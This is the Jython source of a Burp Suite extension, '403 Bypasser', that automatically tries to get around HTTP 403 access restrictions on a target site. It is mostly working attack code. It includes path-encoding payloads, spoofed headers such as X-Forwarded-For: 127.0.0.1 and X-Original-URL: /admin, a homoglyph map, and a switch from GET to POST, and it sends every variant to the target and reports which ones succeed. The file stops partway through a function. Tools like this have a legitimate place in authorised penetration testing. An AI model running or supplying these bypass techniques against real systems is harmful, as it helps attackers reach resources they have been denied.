# Full Code for 403 Bypasser Burp Suite Extension
# Version with Reordered Checks & Updated Trim Char Logic
# EXPANDED LINES (v2) based on user feedback (2025-04-17)

from burp import IBurpExtender, IScanIssue, IScannerCheck, IContextMenuFactory, IContextMenuInvocation, ITab
from javax.swing import JMenuItem, JPanel, JLabel, JScrollPane, JTextArea, GroupLayout, LayoutStyle, JFrame
from java.awt import BorderLayout
import java.util.ArrayList as ArrayList
import java.lang.String as String
from java.lang import Short
import java.util.Arrays # For copyOfRange
import java.lang.reflect.Array # For creating empty byte[]
import java.lang.Byte # For empty byte[] type
import cgi

# For URL encoding
from java.net import URLEncoder

import sys
import thread
# import traceback # Keep commented unless needed for deep debugging

# --- Default Payloads & Config ---
extentionName = "403 Bypasser"

# Payloads for Query Path manipulation (used by generatePayloads)
defaultQueryPayloads = [
    "%09", "%20", "%23", "%2e", "%2f", "%5c", ".", "..;", "%2e%2e;%2f", ";%09%2f",
    ";%09..%2f", ";%09..;%2f", ";%2f..%2f", "xpto/%2e%2e%2f", "xpto/..%2f", "xpto/..;%2f", "%23/../", "%23/..%2f", "(S(X))", "(S(X))/../(S(X))"
]

# Payloads to be double-encoded for specific tests
payloadsToDoubleEncode = ["%09", "%2e", "%2f", "%5c", ".."]

# Trim characters for specific tests (as Unicode characters)
trimCharsToTest = [u'\u0085', u'\u00A0', u'\u0009', u'\u000C'] # NEL, NBSP, HT, FF

# Headers that might contain paths and should be adapted by the script
HEADERS_WITH_PATHS_TO_ADAPT = {
    "x-original-url",
    "x-override-url",
    "x-rewrite-url"
}

# Default Header Payloads LIST FOR THE UI - PATH-BASED HEADERS REMOVED
defaultHeaderPayloadsForUI = [
    # IP-based headers
    "Base-Url: 127.0.0.1", "CF-Connecting_IP: 127.0.0.1", "CF-Connecting-IP: 127.0.0.1",
    "Client-IP: 127.0.0.1", "Destination: 127.0.0.1", "From: 127.0.0.1", "Host: 127.0.0.1",
    "Http-Url: 127.0.0.1", "Origin: 127.0.0.1", "Proxy: 127.0.0.1", "Proxy-Host: 127.0.0.1",
    "Proxy-Url: 127.0.0.1", "Real-Ip: 127.0.0.1", "Redirect: 127.0.0.1", "Referer: 127.0.0.1",
    "Referrer: 127.0.0.1", "Refferer: 127.0.0.1", "Request-Uri: 127.0.0.1",
    "True-Client-IP: 127.0.0.1", "Uri: 127.0.0.1", "Url: 127.0.0.1", "X-Client-IP: 127.0.0.1",
    "X-Custom-IP-Authorization: 127.0.0.1", "X-Forwarded: 127.0.0.1", "X-Forwarded-By: 127.0.0.1",
    "X-Forwarded-For: 127.0.0.1", "X-Forwarded-For-Original: 127.0.0.1",
    "X-Forwarded-Host: 127.0.0.1", "X-Forwarded-Server: 127.0.0.1", "X-Forwarder-For: 127.0.0.1",
    "X-Forward-For: 127.0.0.1", "X-Host: 127.0.0.1", "X-Http-Destinationurl: 127.0.0.1",
    "X-HTTP-DestinationURL: 127.0.0.1", "X-Http-Host-Override: 127.0.0.1",
    "X-Originally-Forwarded-For: 127.0.0.1", "X-Original-Remote-Addr: 127.0.0.1",
    "X-Originating-IP: 127.0.0.1",
    "X-Proxy-Url: 127.0.0.1", "X-ProxyUser-Ip: 127.0.0.1", "X-Real-Ip: 127.0.0.1",
    "X-Referrer: 127.0.0.1", "X-Remote-Addr: 127.0.0.1", "X-Remote-IP: 127.0.0.1",
    "X-True-IP: 127.0.0.1", "X-WAP-Profile: 127.0.0.1",
]

# Internal list including path-based headers for the script's logic
internalDefaultHeaderPayloads = defaultHeaderPayloadsForUI + [
    "X-Original-Url: /admin", # Placeholder path
    "X-Original-URL: /admin",
    "X-Override-Url: /admin",
    "X-Rewrite-Url: /admin",
    "X-Rewrite-URL: /admin"
]

# Default False Positives - Start empty for user configuration
defaultFalsePositives = []

# --- Homoglyph Map ---
homoglyphMap = {
    "a": [ u"\u0430", u"\u00e0", u"\u00e1", u"\u1ea1", u"\u0105" ], "c": [ u"\u0441", u"\u0188", u"\u010b" ],
    "d": [ u"\u0501", u"\u0257" ], "e": [ u"\u0435", u"\u1eb9", u"\u0117", u"\u00e9", u"\u00e8" ],
    "g": [ u"\u0121" ], "h": [ u"\u04bb" ], "i": [ u"\u0456", u"\u00ed", u"\u00ec", u"\u00ef" ],
    "j": [ u"\u0458", u"\u029d" ], "k": [ u"\u03ba" ], "l": [ u"\u04cf", u"\u1e37" ], "n": [ u"\u0578" ],
    "o": [ u"\u043e", u"\u03bf", u"\u0585", u"\u022f", u"\u1ecd", u"\u1ecf", u"\u01a1", u"\u00f6", u"\u00f3", u"\u00f2" ],
    "p": [ u"\u0440" ], "q": [ u"\u0566" ], "s": [ u"\u0282" ], "u": [ u"\u03c5", u"\u057d", u"\u00fc", u"\u00fa", u"\u00f9" ],
    "v": [ u"\u03bd", u"\u0475" ], "x": [ u"\u0445", u"\u04b3" ], "y": [ u"\u0443", u"\u00fd" ],
    "z": [ u"\u0290", u"\u017c" ]
}

# --- Burp Extender Class ---
class BurpExtender(IBurpExtender, IScannerCheck, IContextMenuFactory, ITab):

    # --- registerExtenderCallbacks ---
    def registerExtenderCallbacks(self, callbacks):
        self.callbacks = callbacks
        self.helpers = self.callbacks.getHelpers()
        self.callbacks.registerScannerCheck(self)
        self.callbacks.registerContextMenuFactory(self)
        self.callbacks.setExtensionName(extentionName)
        self.frm = uiTab()
        self.callbacks.addSuiteTab(self)
        sys.stdout = self.callbacks.getStdout()
        sys.stderr = self.callbacks.getStderr()
        print("403 Bypasser extension loaded.")
        print("Default payloads and false positive keywords loaded into the UI tab.")
        try:
            self.frm.queryPayloadsTextArea.setText("\n".join(defaultQueryPayloads))
            self.frm.headerPayloadsTextArea.setText("\n".join(defaultHeaderPayloadsForUI)) # UI List
            self.frm.falsePositivesTextArea.setText("\n".join(defaultFalsePositives)) # Empty List
            print("Successfully populated UI text areas with defaults.")
        except Exception as e:
            print("(!) Error setting default text in UI areas: {}".format(e))
        return None

    # --- getTabCaption, getUiComponent ---
    def getTabCaption(self):
        return extentionName

    def getUiComponent(self):
        return self.frm.panel

    # --- createMenuItems, testFromMenu ---
    def createMenuItems(self, invocation):
        self.context = invocation
        menuList = []
        menuItem = JMenuItem("Send to 403 Bypasser (Active Scan)", actionPerformed=self.testFromMenu)
        menuList.append(menuItem)
        return menuList

    def testFromMenu(self, event):
        selectedMessages = self.context.getSelectedMessages()
        if not selectedMessages:
            print("No messages selected.")
            return None
        print("Sending {} selected message(s) to 403 Bypasser scan...".format(len(selectedMessages)))
        for message in selectedMessages:
            # Use thread.start_new_thread for background execution
            thread.start_new_thread(self.doActiveScan, (message, None, True ))
        return None

    # --- Passive Scan Entry Point ---
    def doPassiveScan(self, baseRequestResponse):
        # Passive scan currently does nothing
        return None

    # --- Active Scan Entry Point ---
    def doActiveScan(self, baseRequestResponse, insertionPoint, isCalledFromMenu=False):
        baseResponseBytes = baseRequestResponse.getResponse()
        # Only proceed if the original response is 403 OR if called from the menu
        if not isCalledFromMenu and not self.isInteresting(baseResponseBytes):
            return None

        print("\n--- Starting 403 Bypass Scan ---")
        targetUrl = "[Could not analyze request URL]"
        try:
            req_info = self.helpers.analyzeRequest(baseRequestResponse)
            if req_info:
                targetUrl = str(req_info.getUrl())
        except Exception as e:
             print("(!) Error getting target URL: {}".format(e))

        print("Target: " + targetUrl)

        if self.isInteresting(baseResponseBytes):
            print("Original response status: 403 Forbidden (Scan proceeds)")
        else:
            print("Original response status: Not 403 (Scan proceeds as called from menu)")

        # Call the main test orchestration function
        issueResultList = self.testRequest(baseRequestResponse)

        if issueResultList:
            print("Scan complete: Bypass FOUND!")
            # If called from menu, add issue directly to Scanner results
            if isCalledFromMenu and isinstance(issueResultList, list) and len(issueResultList) > 0:
                try:
                    existing_issues = self.callbacks.getScanIssues(targetUrl)
                    is_duplicate = False
                    for existing in existing_issues:
                        if self.consolidateDuplicateIssues(existing, issueResultList[0]) == -1:
                            is_duplicate = True
                            print("Scan issue seems to be a duplicate, not adding again from menu.")
                            break
                    if not is_duplicate:
                        self.callbacks.addScanIssue(issueResultList[0])
                        print("Added scan issue from context menu trigger.")
                except Exception as e:
                    # Fallback: Add the issue anyway if check fails
                    print("(!) Error checking duplicates: {}".format(e))
                    # Check if the issue object is valid before adding
                    if issueResultList[0]:
                         self.callbacks.addScanIssue(issueResultList[0])
                    else:
                         print("(!) Cannot add invalid issue object.")

                return None # Return None as we handled adding the issue
            else:
                # If called by Scanner, return the list of issues
                return issueResultList
        else:
            print("Scan complete: No bypass found.")
            return None # Return None as no issues found

    # --- Helper: Check if Response is 403 ---
    def isInteresting(self, response):
        if response is None:
            return False
        try:
            # Get status code from response info
            responseInfo = self.helpers.analyzeResponse(response)
            # Check if responseInfo is valid before getting status code
            if responseInfo:
                 return responseInfo.getStatusCode() == 403
            else:
                 print("(!) Could not analyze response to check status code.")
                 return False
        except Exception as e:
            # Handle exceptions during analysis
            print("(!) Error analyzing status code: {}".format(e))
            return False

    # --- Helper: Find Char Indices ---
    def findAllCharIndexesInString(self, s, ch):
        # Use list comprehension for conciseness
        return [i for i, ltr in enumerate(s) if ltr == ch]

    # --- Helper: Compare Response Bodies ---
    def compareResponseBodies(self, response1_bytes, response2_bytes):
        # Handle None cases first
        if response1_bytes is None and response2_bytes is None:
            return True
        if response1_bytes is None or response2_bytes is None:
            return False
        try:
            # Extract bodies using body offset
            info1 = self.helpers.analyzeResponse(response1_bytes)
            info2 = self.helpers.analyzeResponse(response2_bytes)
            # Check if analysis was successful
            if info1 is None or info2 is None:
                print("     (!) Error analyzing one or both responses for body comparison.")
                return False # Cannot compare if analysis failed

            body1 = response1_bytes[info1.getBodyOffset():]
            body2 = response2_bytes[info2.getBodyOffset():]
            # Direct byte comparison
            return body1 == body2
        except Exception as e:
            # Log error and assume bodies are different
            print("     (!) Error comparing response bodies: {}".format(e))
            return False

    # --- Helper: Double URL Encode ---
    def doubleUrlEncode(self, payload):
        """Double URL encodes a given payload string."""
        if payload is None:
            return None
        # Assume payload is already single-encoded (e.g., %2e)
        # Second encode: Encode the '%' character
        return payload.replace('%', '%25') # e.g. %2e -> %252e

    # --- Helper: URL Encode Single Char ---
    def urlEncodeChar(self, char_to_encode):
        """URL encodes a single character"""
        if not char_to_encode or len(char_to_encode) != 1:
            return char_to_encode # Return original if invalid input
        # Use ord to get value, then hex format. zfill ensures 2 digits.
        # Use uppercase hex as per RFC 3986 (though lowercase often works)
        return '%' + hex(ord(char_to_encode))[2:].zfill(2).upper()

    # --- Helper: Unicode Encode Single Char (URL Encoded form) ---
    def unicodeEncodeCharForUrl(self, char_to_encode):
        """Unicode encodes (\uXXXX) and then URL encodes the backslash"""
        if not char_to_encode or len(char_to_encode) != 1:
            return char_to_encode
        # Format as \uXXXX
        unicode_repr = '\\u' + hex(ord(char_to_encode))[2:].zfill(4)
        # URL Encode the backslash
        return unicode_repr.replace('\\', '%5C') # %5C is URL encode for \


    # --- Preliminary Path Sensitivity Check ---
    def preliminaryPathCheck(self, baseRequestResponse, httpService):
        print("  [Prelim Check] Performing preliminary path sensitivity check...")
        sensitive_indices = set()
        originalRequestInfo = None
        originalResponseBytes = None
        originalPath = "/"
        originalHeaders = None
        originalMethod = None
        originalProtocol = "HTTP/1.1"
        originalBodyBytes = None
        try:
            originalRequestInfo = self.helpers.analyzeRequest(baseRequestResponse)
            # Check if request analysis failed
            if originalRequestInfo is None:
                 print("    (!) Failed to analyze original request for prelim check.")
                 return None

            originalResponseBytes = baseRequestResponse.getResponse()
            # Check if original response exists
            if originalResponseBytes is None:
                print("    (!) Original response missing.")
                return None # Indicate check couldn't run reliably

            tempPath = originalRequestInfo.getUrl().getPath()
            # Check if path is valid for segment analysis
            if tempPath is None or not tempPath or tempPath == "/":
                print("    (!) Path empty/root.")
                return None # No segments to check
            originalPath = tempPath

            # Get necessary components from original request
            originalHeaders = list(originalRequestInfo.getHeaders())
            originalMethod = originalRequestInfo.getMethod()
            original_request_line_parts = originalHeaders[0].split(" ", 2)
            # Default if parse fails
            if len(original_request_line_parts) == 3:
                 originalProtocol = original_request_line_parts[2]

            originalBodyOffset = originalRequestInfo.getBodyOffset()
            raw_req = baseRequestResponse.getRequest()
            if len(raw_req) > originalBodyOffset:
                 originalBodyBytes = java.util.Arrays.copyOfRange(raw_req, originalBodyOffset, len(raw_req))
            else:
                 originalBodyBytes = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 0)

        except Exception as analysis_err:
            print("    (!) Error analyzing request/response for prelim check: {}".format(analysis_err))
            return None

        try:
            # Split path into segments
            segments = [s for s in originalPath.strip('/').split('/')]
            print("    Segments: {}".format(segments))

            # Iterate through each segment
            for i, segment in enumerate(segments):
                # Skip empty segments that might result from multiple slashes
                if not segment:
                    continue

                # Create modified segment (change last char, handle single char)
                modified_segment = ""
                if len(segment) > 1:
                    modified_segment = segment[:-1] + 'X'
                else:
                    modified_segment = segment + 'X'

                # Reconstruct path with the modified segment
                temp_segments = list(segments) # Create a copy
                temp_segments[i] = modified_segment
                modifiedPath = "/" + "/".join(temp_segments)
                # Preserve trailing slash if present in original
                if originalPath.endswith('/') and originalPath != "/":
                    modifiedPath += "/"

                print("    Testing segment {}: '{}' -> '{}' (Path: {})".format(i, segment, modified_segment, modifiedPath))

                try:
                    # Build new request
                    new_request_line = "{} {} {}".format(originalMethod, modifiedPath, originalProtocol)
                    newHeadersList = ArrayList()
                    newHeadersList.add(String(new_request_line))
                    # Add original headers (excluding request line)
                    if len(originalHeaders) > 1:
                        for h_idx in range(1, len(originalHeaders)):
                            newHeadersList.add(originalHeaders[h_idx])

                    newRequestBytes = self.helpers.buildHttpMessage(newHeadersList, originalBodyBytes)
                    # Send the request
                    newRequestResult = self.callbacks.makeHttpRequest(httpService, newRequestBytes)
                    newResponseBytes = newRequestResult.getResponse()

                    # Analyze the response
                    if newResponseBytes is None:
                        print("      -> No response received for modified path. Assuming sensitivity.")
                        sensitive_indices.add(i)
                        continue # Move to next segment

                    newResponseInfo = self.helpers.analyzeResponse(newResponseBytes)
                    if newResponseInfo is None:
                         print("      -> Failed to analyze response for modified path. Assuming sensitivity.")
                         sensitive_indices.add(i)
                         continue

                    newStatusCode = newResponseInfo.getStatusCode()

                    # Check if response changed significantly (status or body)
                    if newStatusCode != 403 or not self.compareResponseBodies(originalResponseBytes, newResponseBytes):
                        print("      -> Status: {} (Changed/Body differs). Segment {} is SENSITIVE.".format(newStatusCode, i))
                        sensitive_indices.add(i)
                    else:
                        # Status is 403 and body is the same
                        print("      -> Status: 403 (Same Body). Segment {} is NOT sensitive.".format(i))

                except Exception as req_err:
                    # Log errors during individual segment tests but continue
                    print("      (!) Error sending request for segment {}: {}".format(i, req_err))
                    # Assuming sensitivity on error might be too noisy, let's skip instead
                    # sensitive_indices.add(i)
                    continue # Skip to next segment on error

            print("  [Prelim Check] Sensitive segment indices found: {}".format(sensitive_indices if sensitive_indices else "None"))
            return sensitive_indices

        except Exception as e:
            # Log errors during the overall check
            print("    (!) Error during preliminary path check logic: {}".format(e))
            # import traceback; traceback.print_exc(file=sys.stderr) # For debugging
            return None # Indicate check failed

    # --- Generate Path Payloads (Using less optimized version from user) ---
    def generatePayloads(self, path, payload, sensitive_indices=None):
        print("    [generatePayloads] Generating payloads for path: '{}', payload: '{}'".format(path, payload))
        generated_payloads = set()
        clean_payload = payload.strip('/')
        if not clean_payload:
            return []

        # Root path handling
        if not path or path == "/":
            generated_payloads.add("/" + clean_payload)
            generated_payloads.add("/" + clean_payload + "/")
            if payload != clean_payload:
                generated_payloads.add("/" + payload.strip('/'))
            return list(generated_payloads)

        # Fallback: Generate all standard variations
        slash_indices = self.findAllCharIndexesInString(path, "/")
        indices = slash_indices

        # --- Insertions before ---
        for i in indices:
            if i > 0:
                generated_payloads.add(path[:i] + "/" + clean_payload + path[i:])
        # --- Insertions after ---
        for i in indices:
            if i < len(path) - 1:
                generated_payloads.add(path[:i+1] + clean_payload + path[i+1:])
            else:
                generated_payloads.add(path + clean_payload)
        # --- Replacements ---
        for k in range(len(indices) - 1):
            i = indices[k]
            j = indices[k+1]
            # Skip replacing the only segment via this method
            if k == 0 and i == 0 and len(indices) == 2:
                continue
            # Ensure content exists between slashes
            if j > i + 1:
                generated_payloads.add(path[:i+1] + clean_payload + path[j:])
        # --- Appending ---
        if path.endswith('/'):
            generated_payloads.add(path + clean_payload)
            generated_payloads.add(path + clean_payload + "/")
        else:
            generated_payloads.add(path + "/" + clean_payload)
            generated_payloads.add(path + "/" + clean_payload + "/")
        # Append raw payload too
        generated_payloads.add(path + payload)
        # --- Prefixing last segment ---
        if '/' in path.strip('/'):
            last_slash = path.rfind('/')
            if last_slash >= 0:
                generated_payloads.add(path[:last_slash+1] + clean_payload + path[last_slash+1:])

        print("    [generatePayloads] Generated variations: {}".format(len(generated_payloads)))
        return list(generated_payloads)

    # --- False Positive Check ---
    def isFalsePositive(self, responseBytes, falsePositiveKeywords):
        if not falsePositiveKeywords:
            return False
        if responseBytes is None:
            return False
        try:
            responseInfo = self.helpers.analyzeResponse(responseBytes)
            if responseInfo is None:
                 print("         (!) [FP Check] Failed to analyze response.")
                 return False # Cannot check if analysis fails

            bodyOffset = responseInfo.getBodyOffset()
            responseBodyBytes = responseBytes[bodyOffset:]
            # Attempt decoding, fallback to latin-1
            responseBodyStr = ""
            try:
                # Use helpers.bytesToString for potentially better handling
                tempStr = self.helpers.bytesToString(responseBodyBytes)
                if tempStr is not None: # Check if conversion succeeded
                     responseBodyStr = tempStr.lower()
                else: # Fallback if bytesToString fails
                     responseBodyStr = responseBodyBytes.decode('latin-1', 'ignore').lower()
            except Exception: # Catch potential errors during bytesToString or lower()
                 try:
                    responseBodyStr = responseBodyBytes.decode('latin-1', 'ignore').lower()
                 except Exception as decode_err:
                    print("         (!) [FP Check] Error decoding response body: {}".format(decode_err))
                    return False # Cannot check if decoding fails

            # Check each keyword
            for keyword in falsePositiveKeywords:
                clean_keyword = None
                # Handle potential non-string types from UI gracefully
                kw_type = type(keyword)
                # Use basestring for Jython 2.7 compatibility
                is_string_type = isinstance(keyword, basestring)
                if keyword and is_string_type:
                    clean_keyword = keyword.strip().lower()
                elif keyword is not None: # Fallback for non-string types
                    try:
                        clean_keyword = str(keyword).strip().lower()
                    except Exception:
                        # Ignore keywords that cannot be converted
                        pass
                # Perform check if keyword is valid
                if clean_keyword and clean_keyword in responseBodyStr:
                    print("         >>>>> [FP Check] Match FOUND for keyword '{}'".format(clean_keyword))
                    return True # Is a false positive
        except Exception as e:
            # Log errors during FP check
            print("         (!) [FP Check] Error: {}".format(e))
            return False # Assume not FP on error
        # No keywords matched
        return False

    # --- Bypass Test Functions ---

    # Modified to accept sensitive_indices
    def tryBypassWithQueryPayload(self, baseRequestResponse, payload, httpService, falsePositiveKeywords, sensitive_indices=None):
        print("  [Query] Testing payload: '{}' (Sensitive indices: {})".format(payload, sensitive_indices))
        originalRequestInfo = None
        originalUrl = None
        originalPath = "/"
        originalHeadersJavaList = None
        originalBodyJavaBytes = None
        original_method = None
        original_protocol = "HTTP/1.1"
        try:
            # --- Analyze Original Request ---
            originalRequestInfo = self.helpers.analyzeRequest(baseRequestResponse)
            if originalRequestInfo is None:
                print("    (!) Failed analyze.")
                return None

            originalUrl = originalRequestInfo.getUrl()
            tempPath = originalUrl.getPath() if originalUrl else "/"
            if tempPath is None or not tempPath:
                originalPath = "/"
            else:
                originalPath = tempPath

            originalHeadersJavaList = originalRequestInfo.getHeaders()
            raw_original_request_bytes = baseRequestResponse.getRequest()
            original_body_offset = originalRequestInfo.getBodyOffset()
            if len(raw_original_request_bytes) > original_body_offset:
                originalBodyJavaBytes = java.util.Arrays.copyOfRange(raw_original_request_bytes, original_body_offset, len(raw_original_request_bytes))
            else:
                originalBodyJavaBytes = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 0)

            if not originalHeadersJavaList or originalHeadersJavaList.isEmpty():
                print("    (!) No headers.")
                return None

            original_request_line_parts = originalHeadersJavaList.get(0).split(" ", 2)
            if len(original_request_line_parts) < 3:
                print("    (!) Malformed line.")
                return None
            original_method = original_request_line_parts[0]
            original_protocol = original_request_line_parts[2]

        except Exception as analysis_err:
            print("    (!) Error analyzing: {}".format(analysis_err))
            return None

        # --- Generate Paths (Passing sensitive_indices) ---
        payloadsToTest = self.generatePayloads(originalPath, payload, sensitive_indices)
        if not payloadsToTest:
            return None
        print("    Paths to test: {}".format(len(payloadsToTest)))

        # --- Test Generated Paths ---
        for pathToTest in payloadsToTest:
            try:
                if not pathToTest.startswith("/"):
                    pathToTest = "/" + pathToTest

                # Build new request
                new_request_line_str = "{} {} {}".format(original_method, pathToTest, original_protocol)
                newHeadersList = ArrayList()
                newHeadersList.add(String(new_request_line_str))
                if originalHeadersJavaList.size() > 1:
                    for i in range(1, originalHeadersJavaList.size()):
                        newHeadersList.add(originalHeadersJavaList.get(i))

                newRequestBytes = self.helpers.buildHttpMessage(newHeadersList, originalBodyJavaBytes)
                newRequestResult = self.callbacks.makeHttpRequest(httpService, newRequestBytes)
                responseBytes = newRequestResult.getResponse()

                # Check response existence
                if responseBytes is None:
                    continue

                responseInfo = self.helpers.analyzeResponse(responseBytes)
                # Check if response analysis failed
                if responseInfo is None:
                     print("      (!) Failed to analyze response for path '{}'".format(pathToTest))
                     continue

                newRequestStatusCode = responseInfo.getStatusCode()

                # Check for bypass success (2xx and not FP)
                if 200 <= newRequestStatusCode < 300:
                    is_fp = self.isFalsePositive(responseBytes, falsePositiveKeywords)
                    if not is_fp:
                        # Build details for reporting
                        portStr = ""
                        if originalUrl and originalUrl.getPort() not in [-1, originalUrl.getDefaultPort()]:
                            portStr = ":" + str(originalUrl.getPort())

                        vulnUrlStr = "{}://{}{}{}".format(
                            originalUrl.getProtocol() if originalUrl else "http",
                            originalUrl.getHost() if originalUrl else httpService.getHost(),
                            portStr,
                            pathToTest
                        )
                        contentLength = "N/A"
                        try:
                            # Safely get content length
                            resp_headers = responseInfo.getHeaders()
                            for idx in range(1, resp_headers.size()): # Start from 1 to skip status line
                                header = resp_headers.get(idx)
                                if header and header.lower().startswith("content-length:"):
                                    contentLength = header.split(":", 1)[1].strip()
                                    break
                        except Exception as cl_err:
                            print("      (!) Error getting Content-Length: {}".format(cl_err))
                            pass # Keep N/A

                        print("      ****** SUCCESS (Query Bypass) ******")
                        print("      URL: " + vulnUrlStr)
                        print("      Payload: " + payload)
                        print("      Path: " + pathToTest)

                        # Highlight payload in URL for display
                        displayPath = vulnUrlStr
                        try:
                            clean_p = payload.strip('/')
                            if payload in pathToTest:
                                displayPath = vulnUrlStr.replace(payload, "<b>" + payload + "</b>", 1)
                            elif clean_p and clean_p in pathToTest:
                                displayPath = vulnUrlStr.replace(clean_p, "<b>" + clean_p + "</b>", 1)
                        except Exception as highlight_err:
                            print("      (!) Error highlighting payload: {}".format(highlight_err))
                            pass # Ignore highlighting errors

                        # Return values needed for the simple text format
                        result_data = {
                            "type": "Query Payload",
                            "bypassed_url": displayPath, # Highlighted URL
                            "payload_used": payload,
                            "status": newRequestStatusCode,
                            "length": contentLength,
                            "http_message": newRequestResult
                        }
                        return result_data # Found bypass, return it

            except Exception as e:
                # Log errors for individual path tests
                print("      (!) Error processing path '{}': {}".format(pathToTest, e))
                # import traceback; traceback.print_exc(file=sys.stderr) # For debugging

        # No bypass found for this payload after testing all paths
        return None

    # --- tryBypassWithHeaderPayload ---
    def tryBypassWithHeaderPayload(self, baseRequestResponse, payload, httpService, falsePositiveKeywords):
        print("  [Header] Testing payload: '" + payload + "'")
        originalRequestInfo = None
        originalHeaders = None
        originalUrl = None
        originalPath = "/"
        originalBodyJavaBytes = None
        try:
            # --- Analyze Request ---
            originalRequestInfo = self.helpers.analyzeRequest(baseRequestResponse)
            if originalRequestInfo is None:
                print("    (!) Failed analyze.")
                return None

            originalHeaders = list(originalRequestInfo.getHeaders())
            originalUrl = originalRequestInfo.getUrl()
            tempPath = originalUrl.getPath() if originalUrl else "/"
            if tempPath is None or not tempPath:
                originalPath = "/"
            else:
                originalPath = tempPath

            raw_original_request_bytes = baseRequestResponse.getRequest()
            original_body_offset = originalRequestInfo.getBodyOffset()
            if len(raw_original_request_bytes) > original_body_offset:
                originalBodyJavaBytes = java.util.Arrays.copyOfRange(raw_original_request_bytes, original_body_offset, len(raw_original_request_bytes))
            else:
                originalBodyJavaBytes = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 0)

        except Exception as analysis_err:
             print("    (!) Error analyzing: {}".format(analysis_err))
             return None

        try:
            # --- Process Payload ---
            header_parts = payload.split(":", 1)
            if len(header_parts) != 2:
                print("    (!) Invalid format: " + payload)
                return None
            header_name = header_parts[0].strip()
            header_value = header_parts[1].strip()
            header_name_lower = header_name.lower()
            if not header_name:
                print("    (!) Empty name.")
                return None

            # --- Path Adaptation ---
            adapted_header_value = header_value
            if header_name_lower in HEADERS_WITH_PATHS_TO_ADAPT and header_value.startswith('/'):
                print("    Adapting path for '{}'. Original: '{}', Target: '{}'".format(header_name, header_value, originalPath))
                adapted_header_value = originalPath
            payload_normalized = header_name + ": " + adapted_header_value

            # --- Build New Headers ---
            newHeadersList = ArrayList()
            replaced = False
            # Add request line
            if originalHeaders:
                newHeadersList.add(originalHeaders[0])
            else:
                 print("    (!) Original request missing headers.")
                 return None # Cannot proceed without request line

            # Process original headers
            for i in range(1, len(originalHeaders)):
                header = originalHeaders[i]
                current_name = ""
                try:
                    # Safely get current header name
                    current_name = header.split(":", 1)[0].strip().lower()
                except IndexError:
                    pass # Keep original if malformed
                # Replace if names match
                if current_name == header_name_lower:
                    newHeadersList.add(String(payload_normalized))
                    replaced = True
                    print("    Replaced existing: " + header_name)
                else:
                    # Keep original
                    newHeadersList.add(header)
            # Add if not replaced
            if not replaced:
                newHeadersList.add(String(payload_normalized))
                print("    Added new: " + header_name)

            # --- Send & Check ---
            newRequestBytes = self.helpers.buildHttpMessage(newHeadersList, originalBodyJavaBytes)
            newRequestResult = self.callbacks.makeHttpRequest(httpService, newRequestBytes)
            responseBytes = newRequestResult.getResponse()
            if responseBytes is None:
                return None

            responseInfo = self.helpers.analyzeResponse(responseBytes)
            if responseInfo is None:
                 print("      (!) Failed to analyze response for header bypass.")
                 return None

            newStatusCode = responseInfo.getStatusCode()

            # Check success
            if 200 <= newStatusCode < 300:
                is_fp = self.isFalsePositive(responseBytes, falsePositiveKeywords)
                if not is_fp:
                    originalUrlStr = str(originalUrl)
                    contentLength = "N/A"
                    try:
                        resp_headers = responseInfo.getHeaders()
                        for idx in range(1, resp_headers.size()):
                            header = resp_headers.get(idx)
                            if header and header.lower().startswith("content-length:"):
                                contentLength = header.split(":", 1)[1].strip()
                                break
                    except Exception as cl_err:
                         print("      (!) Error getting Content-Length: {}".format(cl_err))
                         pass

                    print("      ****** SUCCESS (Header Bypass) ******")
                    print("      URL: " + originalUrlStr)
                    print("      Header Used: " + payload_normalized)
                    # Return values needed for the simple text format
                    result_data = {
                        "type": "Header Injection",
                        "original_url": originalUrlStr,
                        "header_used": payload_normalized,
                        "status": newStatusCode,
                        "length": contentLength,
                        "http_message": newRequestResult
                    }
                    return result_data

        except Exception as e:
            print("    (!) Error testing header '{}': {}".format(payload, e))
            # import traceback; traceback.print_exc(file=sys.stderr) # For debugging

        return None

    # --- tryBypassWithPOSTAndEmptyCL ---
    def tryBypassWithPOSTAndEmptyCL(self, baseRequestResponse, httpService, falsePositiveKeywords):
        print("  [Method] Testing POST + Content-Length: 0")
        requestInfo = None
        originalHeaders = None
        try:
            requestInfo = self.helpers.analyzeRequest(baseRequestResponse)
            if requestInfo is None:
                print("    (!) Failed analyze.")
                return None

            originalHeaders = list(requestInfo.getHeaders())
            # Only proceed if original method is GET
            if not originalHeaders or not originalHeaders[0].startswith("GET "):
                print("    Skipping: original method not GET.")
                return None

        except Exception as analysis_err:
            print("    (!) Error analyzing request for POST+CL:0: {}".format(analysis_err))
            return None

        try:
            # Build new headers
            headers = ArrayList()
            headers.add(String(originalHeaders[0].replace("GET ", "POST ", 1))) # Change method
            cl_found = False
            # Add other headers, removing/replacing existing Content-Length
            for i in range(1, len(originalHeaders)):
                header_line = originalHeaders[i]
                if header_line.lower().startswith("content-length:"):
                    headers.add(String("Content-Length: 0"))
                    cl_found=True
                    print("    Replaced existing Content-Length.")
                else:
                    headers.add(header_line)

            # Add Content-Length if not found
            if not cl_found:
                headers.add(String("Content-Length: 0"))
                print("    Added Content-Length: 0.")

            print("    Changed method to POST.")

            # Create empty body
            emptyBody = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 0)
            # Send request
            newRequestBytes = self.helpers.buildHttpMessage(headers, emptyBody)
            newRequestResult = self.callbacks.makeHttpRequest(httpService, newRequestBytes)
            responseBytes = newRequestResult.getResponse()
            if responseBytes is None:
                return None

            # Check response
            responseInfo = self.helpers.analyzeResponse(responseBytes)
            if responseInfo is None:
                 print("      (!) Failed to analyze response for POST+CL:0 bypass.")
                 return None

            newStatusCode = responseInfo.getStatusCode()
            if 200 <= newStatusCode < 300:
                is_fp = self.isFalsePositive(responseBytes, falsePositiveKeywords)
                if not is_fp:
                    requestUrlStr = str(requestInfo.getUrl())
                    contentLength = "N/A"
                    try:
                        resp_headers = responseInfo.getHeaders()
                        for idx in range(1, resp_headers.size()):
                            header = resp_headers.get(idx)
                            if header and header.lower().startswith("content-length:"):
                                contentLength = header.split(":", 1)[1].strip()
                                break
                    except Exception as cl_err:
                        print("      (!) Error getting Content-Length: {}".format(cl_err))
                        pass

                    print("      ****** SUCCESS (Method Change Bypass) ******")
                    print("      URL: " + requestUrlStr)
                    # Return values needed for the simple text format
                    result_data = {
                        "type": "Method Change",
                        "url": requestUrlStr,
                        "technique": "POST + Content-Length: 0",
